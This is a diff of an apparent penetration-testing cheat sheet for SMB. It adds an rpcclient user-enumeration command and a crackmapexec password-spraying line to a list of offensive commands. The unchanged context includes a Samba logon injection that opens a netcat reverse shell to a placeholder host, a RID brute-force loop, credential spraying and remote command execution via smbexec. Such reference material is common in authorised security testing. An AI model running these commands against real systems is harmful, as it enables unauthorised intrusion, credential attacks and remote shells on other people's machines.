@@ -258,6 +258,7 @@ $ smbmap -H <IP address> --upload test.txt "<share name>\file.txt"
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
 smb: \> !ls
 $ rpcclient -U "" <IP address>
+rpcclient $> enumdomusers
 $ for i in $(seq 500 1100);do rpcclient -N -U "" <IP address> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
 $ samrdump.py <IP address>	
 msf> use auxiliary/scanner/smb/smb_version
@@ -273,6 +274,7 @@ $ enum4linux-ng.py -A -C <IP address>
 $ crackmapexec smb <IP address> --shares
 $ crackmapexec smb <IP address> --shares -u '' -p ''
 $ crackmapexec smb <IP address> -u <usernames.txt> -p '<password>'
+$ crackmapexec smb <IP address> -u <usernames.txt> -p '<password>' --local-auth
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec smb <IP address> -u <username> -p '<password>' -x 'whoami' --exec-method smbexec
 $ crackmapexec smb <CIDR IP address> -u <username> -p '<password>' --loggedon-users
